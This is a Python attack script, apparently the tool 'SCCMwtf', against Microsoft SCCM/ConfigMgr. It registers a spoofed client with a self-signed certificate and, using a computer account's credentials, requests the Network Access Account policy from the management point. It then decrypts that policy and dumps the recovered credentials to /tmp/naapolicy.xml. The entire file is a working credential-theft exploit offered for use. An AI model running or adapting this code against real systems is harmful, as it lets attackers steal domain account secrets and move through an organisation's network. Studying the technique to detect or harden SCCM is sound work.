import datetime
import zlib
import requests
import re
import time
import sys
from pyasn1.codec.der.decoder import decode
from pyasn1_modules import rfc5652
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.serialization import PublicFormat
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.primitives.asymmetric.padding import PKCS1v15
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography import x509
from cryptography.x509.oid import NameOID
from cryptography.hazmat.primitives import hashes
from cryptography.x509 import ObjectIdentifier
from requests_toolbelt.multipart import decoder
from requests_ntlm import HttpNtlmAuth

# Who needs just 1 date format :/
dateFormat1 = "%Y-%m-%dT%H:%M:%SZ"
dateFormat2 = "%Y%m%d%H%M%S.000000+000"
dateFormat3 = "%m/%d/%Y %H:%M:%S"

now = datetime.datetime.utcnow()

# Huge thanks to @_Mayyhem with SharpSCCM for making requesting these easy!
registrationRequestWrapper = "<ClientRegistrationRequest>{data}<Signature><SignatureValue>{signature}</SignatureValue></Signature></ClientRegistrationRequest>\x00"
registrationRequest = """<Data HashAlgorithm="1.2.840.113549.1.1.11" SMSID="" RequestType="Registration" TimeStamp="{date}"><AgentInformation AgentIdentity="CCMSetup.exe" AgentVersion="5.00.8325.0000" AgentType="0" /><Certificates><Encryption Encoding="HexBinary" KeyType="1">{encryption}</Encryption><Signing Encoding="HexBinary" KeyType="1">{signature}</Signing></Certificates><DiscoveryProperties><Property Name="Netbios Name" Value="{client}" /><Property Name="FQ Name" Value="{clientfqdn}" /><Property Name="Locale ID" Value="2057" /><Property Name="InternetFlag" Value="0" /></DiscoveryProperties></Data>"""
msgHeader = """<Msg ReplyCompression="zlib" SchemaVersion="1.1"><Body Type="ByteRange" Length="{bodylength}" Offset="0" /><CorrelationID>{{00000000-0000-0000-0000-000000000000}}</CorrelationID><Hooks><Hook3 Name="zlib-compress" /></Hooks><ID>{{5DD100CD-DF1D-45F5-BA17-A327F43465F8}}</ID><Payload Type="inline" /><Priority>0</Priority><Protocol>http</Protocol><ReplyMode>Sync</ReplyMode><ReplyTo>direct:{client}:SccmMessaging</ReplyTo><SentTime>{date}</SentTime><SourceHost>{client}</SourceHost><TargetAddress>mp:MP_ClientRegistration</TargetAddress><TargetEndpoint>MP_ClientRegistration</TargetEndpoint><TargetHost>{sccmserver}</TargetHost><Timeout>60000</Timeout></Msg>"""
msgHeaderPolicy = """<Msg ReplyCompression="zlib" SchemaVersion="1.1"><Body Type="ByteRange" Length="{bodylength}" Offset="0" /><CorrelationID>{{00000000-0000-0000-0000-000000000000}}</CorrelationID><Hooks><Hook2 Name="clientauth"><Property Name="AuthSenderMachine">{client}</Property><Property Name="PublicKey">{publickey}</Property><Property Name="ClientIDSignature">{clientIDsignature}</Property><Property Name="PayloadSignature">{payloadsignature}</Property><Property Name="ClientCapabilities">NonSSL</Property><Property Name="HashAlgorithm">1.2.840.113549.1.1.11</Property></Hook2><Hook3 Name="zlib-compress" /></Hooks><ID>{{041A35B4-DCEE-4F64-A978-D4D489F47D28}}</ID><Payload Type="inline" /><Priority>0</Priority><Protocol>http</Protocol><ReplyMode>Sync</ReplyMode><ReplyTo>direct:{client}:SccmMessaging</ReplyTo><SentTime>{date}</SentTime><SourceID>GUID:{clientid}</SourceID><SourceHost>{client}</SourceHost><TargetAddress>mp:MP_PolicyManager</TargetAddress><TargetEndpoint>MP_PolicyManager</TargetEndpoint><TargetHost>{sccmserver}</TargetHost><Timeout>60000</Timeout></Msg>"""
policyBody = """<RequestAssignments SchemaVersion="1.00" ACK="false" RequestType="Always"><Identification><Machine><ClientID>GUID:{clientid}</ClientID><FQDN>{clientfqdn}</FQDN><NetBIOSName>{client}</NetBIOSName><SID /></Machine><User /></Identification><PolicySource>SMS:PRI</PolicySource><Resource ResourceType="Machine" /><ServerCookie /></RequestAssignments>"""
reportBody = """<Report><ReportHeader><Identification><Machine><ClientInstalled>0</ClientInstalled><ClientType>1</ClientType><ClientID>GUID:{clientid}</ClientID><ClientVersion>5.00.8325.0000</ClientVersion><NetBIOSName>{client}</NetBIOSName><CodePage>850</CodePage><SystemDefaultLCID>2057</SystemDefaultLCID><Priority /></Machine></Identification><ReportDetails><ReportContent>Inventory Data</ReportContent><ReportType>Full</ReportType><Date>{date}</Date><Version>1.0</Version><Format>1.1</Format></ReportDetails><InventoryAction ActionType="Predefined"><InventoryActionID>{{00000000-0000-0000-0000-000000000003}}</InventoryActionID><Description>Discovery</Description><InventoryActionLastUpdateTime>{date}</InventoryActionLastUpdateTime></InventoryAction></ReportHeader><ReportBody /></Report>"""

class Tools:
  @staticmethod
  def encode_unicode(input):
    # Remove the BOM
    return input.encode('utf-16')[2:]

  @staticmethod
  def write_to_file(input, file):
    with open(file, "w") as fd:
      fd.write(input)

class CryptoTools:
    @staticmethod
    def createCertificateForKey(key, cname):
        subject = issuer = x509.Name([
            x509.NameAttribute(NameOID.COMMON_NAME, cname),
        ])
        cert = x509.CertificateBuilder().subject_name(
            subject
        ).issuer_name(
            issuer
        ).public_key(
            key.public_key()
        ).serial_number(
            x509.random_serial_number()
        ).not_valid_before(
            datetime.datetime.utcnow() - datetime.timedelta(days=2)
        ).not_valid_after(
            datetime.datetime.utcnow() + datetime.timedelta(days=365)
        ).add_extension(
            x509.KeyUsage(digital_signature=True, key_encipherment=False, key_cert_sign=False,
                                  key_agreement=False, content_commitment=False, data_encipherment=True,
                                  crl_sign=False, encipher_only=False, decipher_only=False),
            critical=False,
        ).add_extension(
            # SMS Signing Certificate (Self-Signed)
            x509.ExtendedKeyUsage([ObjectIdentifier("1.3.6.1.4.1.311.101.2"), ObjectIdentifier("1.3.6.1.4.1.311.101")]),
            critical=False,
        ).sign(key, hashes.SHA256())

        return cert

    @staticmethod
    def generateRSAKey():
        key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
        return key

    @staticmethod
    def buildMSPublicKeyBlob(key):
        # Built from spec: https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-mqqb/ade9efde-3ec8-4e47-9ae9-34b64d8081bb
        blobHeader = b"\x06\x02\x00\x00\x00\xA4\x00\x00\x52\x53\x41\x31\x00\x08\x00\x00\x01\x00\x01\x00"
        blob = blobHeader + key.public_key().public_numbers().n.to_bytes(int(key.key_size / 8), byteorder="little")
        return blob.hex().upper()

    # Signs data using SHA256 and then reverses the byte order as per SCCM
    @staticmethod
    def sign(key, data):
        signature = key.sign(data, PKCS1v15(), hashes.SHA256())
        signature_rev = bytearray(signature)
        signature_rev.reverse()
        return bytes(signature_rev)

    # Same for now, but hints in code that some sigs need to have the hash type removed
    @staticmethod
    def signNoHash(key, data):
        signature = key.sign(data, PKCS1v15(), hashes.SHA256())
        signature_rev = bytearray(signature)
        signature_rev.reverse()
        return bytes(signature_rev)

    @staticmethod
    def decrypt(key, data):
        print(key.decrypt(data, PKCS1v15()))

    @staticmethod
    def decrypt3Des(key, encryptedKey, iv, data):
        desKey = key.decrypt(encryptedKey, PKCS1v15())

        cipher = Cipher(algorithms.TripleDES(desKey), modes.CBC(iv))
        decryptor = cipher.decryptor()
        return decryptor.update(data) + decryptor.finalize()

class SCCMTools:

    def __init__(self, server):
        self._server = server
        self._serverURI = f"http://{server}"

    def sendCCMPostRequest(self, data, auth=False, username="", password=""):
        headers = {
            "Connection": "close",
            "User-Agent": "ConfigMgr Messaging HTTP Sender",
            "Content-Type": "multipart/mixed; boundary=\"aAbBcCdDv1234567890VxXyYzZ\""
        }

        if auth:
          r = requests.request("CCM_POST", f"{self._serverURI}/ccm_system_windowsauth/request", headers=headers, data=data, auth=HttpNtlmAuth(username, password))
        else:
          r = requests.request("CCM_POST", f"{self._serverURI}/ccm_system/request", headers=headers, data=data)
        
        if r.status_code == 200:
          multipart_data = decoder.MultipartDecoder.from_response(r)
          for part in multipart_data.parts:
              if part.headers[b'content-type'] == b'application/octet-stream':
                  return zlib.decompress(part.content).decode('utf-16')
        elif r.status_code == 403:
          print(f"[!] Unauthorized!")
        else:
          print(f"[!] Unexpected Error code from SCCM Server: {r.status_code}")

    def requestPolicy(self, url, clientID="", authHeaders=False, retcontent=False):
        headers = {
            "Connection": "close",
            "User-Agent": "ConfigMgr Messaging HTTP Sender"
        }

        if authHeaders == True:
          headers["ClientToken"] = "GUID:{};{};2".format(
            clientID, 
            now.strftime(dateFormat1)
          )
          headers["ClientTokenSignature"] = CryptoTools.signNoHash(self.key, "GUID:{};{};2".format(clientID, now.strftime(dateFormat1)).encode('utf-16')[2:] + "\x00\x00".encode('ascii')).hex().upper()

        r = requests.get(f"{self._serverURI}"+url, headers=headers)
        if retcontent == True:
          return r.content
        else:
          return r.text

    def createCertificate(self, writeToTmp=False):
        self.key = CryptoTools.generateRSAKey()
        self.cert = CryptoTools.createCertificateForKey(self.key, u"ConfigMgr Client")

        if writeToTmp:
            with open("/tmp/key.pem", "wb") as f:
                f.write(self.key.private_bytes(
                    encoding=serialization.Encoding.PEM, 
                    format=serialization.PrivateFormat.TraditionalOpenSSL, 
                    encryption_algorithm=serialization.BestAvailableEncryption(b"mimikatz"),
                ))

            with open("/tmp/certificate.pem", "wb") as f:
                f.write(self.cert.public_bytes(serialization.Encoding.PEM))

    def sendRegistration(self, name, fqname, username, password):
        b = self.cert.public_bytes(serialization.Encoding.DER).hex().upper()

        embedded = registrationRequest.format(
          date=now.strftime(dateFormat1), 
          encryption=b, 
          signature=b, 
          client=name, 
          clientfqdn=fqname
        )

        signature = CryptoTools.sign(self.key, Tools.encode_unicode(embedded)).hex().upper()
        request = Tools.encode_unicode(registrationRequestWrapper.format(data=embedded, signature=signature)) + "\r\n".encode('ascii')

        header = msgHeader.format(
          bodylength=len(request)-2, 
          client=name, 
          date=now.strftime(dateFormat1), 
          sccmserver=self._server
        )

        data = "--aAbBcCdDv1234567890VxXyYzZ\r\ncontent-type: text/plain; charset=UTF-16\r\n\r\n".encode('ascii') + header.encode('utf-16') + "\r\n--aAbBcCdDv1234567890VxXyYzZ\r\ncontent-type: application/octet-stream\r\n\r\n".encode('ascii') + zlib.compress(request) + "\r\n--aAbBcCdDv1234567890VxXyYzZ--".encode('ascii')

        deflatedData = self.sendCCMPostRequest(data, True, username, password)
        r = re.findall("SMSID=\"GUID:([^\"]+)\"", deflatedData)
        if r != None:
            return r[0]

        return None

    def sendPolicyRequest(self, name, fqname, uuid, targetName, targetFQDN, targetUUID):
        body = Tools.encode_unicode(policyBody.format(clientid=targetUUID, clientfqdn=targetFQDN, client=targetName)) + b"\x00\x00\r\n"
        payloadCompressed = zlib.compress(body)

        bodyCompressed = zlib.compress(body)
        public_key = CryptoTools.buildMSPublicKeyBlob(self.key)
        clientID = f"GUID:{uuid.upper()}"
        clientIDSignature = CryptoTools.sign(self.key, Tools.encode_unicode(clientID) + "\x00\x00".encode('ascii')).hex().upper()
        payloadSignature = CryptoTools.sign(self.key, bodyCompressed).hex().upper()

        header = msgHeaderPolicy.format(
          bodylength=len(body)-2, 
          sccmserver=self._server, 
          client=name, 
          publickey=public_key, 
          clientIDsignature=clientIDSignature, 
          payloadsignature=payloadSignature, 
          clientid=uuid, 
          date=now.strftime(dateFormat1)
        )

        data = "--aAbBcCdDv1234567890VxXyYzZ\r\ncontent-type: text/plain; charset=UTF-16\r\n\r\n".encode('ascii') + header.encode('utf-16') + "\r\n--aAbBcCdDv1234567890VxXyYzZ\r\ncontent-type: application/octet-stream\r\n\r\n".encode('ascii') + bodyCompressed + "\r\n--aAbBcCdDv1234567890VxXyYzZ--".encode('ascii')

        deflatedData = self.sendCCMPostRequest(data)
        result = re.search("PolicyCategory=\"NAAConfig\".*?<!\[CDATA\[https*://<mp>([^]]+)", deflatedData, re.DOTALL + re.MULTILINE)
        #r = re.findall("http://<mp>(/SMS_MP/.sms_pol?[^\]]+)", deflatedData)
        return [result.group(1)]

    def parseEncryptedPolicy(self, result):
        # Man.. asn1 suxx!
        content, rest = decode(result, asn1Spec=rfc5652.ContentInfo())
        content, rest = decode(content.getComponentByName('content'), asn1Spec=rfc5652.EnvelopedData())
        encryptedRSAKey = content['recipientInfos'][0]['ktri']['encryptedKey'].asOctets()
        iv = content['encryptedContentInfo']['contentEncryptionAlgorithm']['parameters'].asOctets()[2:]
        body = content['encryptedContentInfo']['encryptedContent'].asOctets()

        decrypted = CryptoTools.decrypt3Des(self.key, encryptedRSAKey, iv, body)
        policy = decrypted.decode('utf-16')
        return policy

if __name__ == "__main__":
    
    print("SCCMwtf... by @_xpn_")

    target_name = sys.argv[1]
    target_fqdn = sys.argv[2]
    target_sccm = sys.argv[3]
    target_username = sys.argv[4]
    target_password = sys.argv[5]

    print("[*] Args: ")
    print(f"[*] Spoof Name: {target_name}")
    print(f"[*] Spoof FQDN: {target_fqdn}")
    print(f"[*] Target SCCM: {target_sccm}")
    print(f"[*] Computer account username: {target_username}")
    print(f"[*] Computer account password: {target_password}")

    print("[*] Creating certificate for our fake server...")
    tools = SCCMTools(target_sccm)
    tools.createCertificate(True)
    
    print("[*] Registering our fake server...")
    uuid = tools.sendRegistration(target_name, target_fqdn, target_username, target_password)

    print(f"[*] Done.. our ID is {uuid}")

    # If too quick, SCCM requests fail (DB error, jank!)
    time.sleep(4)

    print("[*] Requesting NAAPolicy.. 2 secs")
    urls = tools.sendPolicyRequest(target_name, target_fqdn, uuid, target_name, target_fqdn, uuid)

    print("[*] Parsing for Secretz...")

    for url in urls:
        result = tools.requestPolicy(url)
        if result.startswith("<HTML>"):
          result = tools.requestPolicy(url, uuid, True, True)
          decryptedResult = tools.parseEncryptedPolicy(result)
          Tools.write_to_file(decryptedResult, "/tmp/naapolicy.xml")

    print("[*] Done.. decrypted policy dumped to /tmp/naapolicy.xml")
